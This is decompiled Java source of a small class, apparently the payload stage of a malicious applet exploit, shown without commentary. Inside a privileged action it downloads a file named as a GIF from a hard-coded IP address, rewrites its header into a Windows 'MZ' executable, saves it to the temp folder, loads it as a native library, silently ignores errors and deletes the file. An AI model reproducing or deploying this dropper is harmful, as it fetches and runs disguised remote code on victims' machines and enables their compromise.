import java.security.AccessController;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.DataInputStream;
import java.net.URL;
import java.io.File;
import java.security.PrivilegedExceptionAction;

// 
// Decompiled by Procyon v0.5.30
// 

public class P implements PrivilegedExceptionAction
{
    public Object run() throws Exception {
        final String string = System.getProperty("java.io.tmpdir") + File.separator + Math.random() + ".gif";
        try {
            final URLConnection openConnection = new URL("http://95.211.14.21/measure/p.gif").openConnection();
            openConnection.setDoInput(true);
            openConnection.setUseCaches(false);
            final DataInputStream dataInputStream = new DataInputStream(openConnection.getInputStream());
            dataInputStream.skip(2L);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            fileOutputStream.write(77);
            fileOutputStream.write(90);
            final byte[] array = new byte[4196];
            int read;
            while ((read = dataInputStream.read(array)) > 0) {
                fileOutputStream.write(array, 0, read);
            }
            fileOutputStream.close();
            Runtime.getRuntime().load(string);
        }
        catch (UnsatisfiedLinkError unsatisfiedLinkError) {}
        catch (Exception ex) {}
        new File(string).delete();
        return null;
    }
    
    public P() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
}
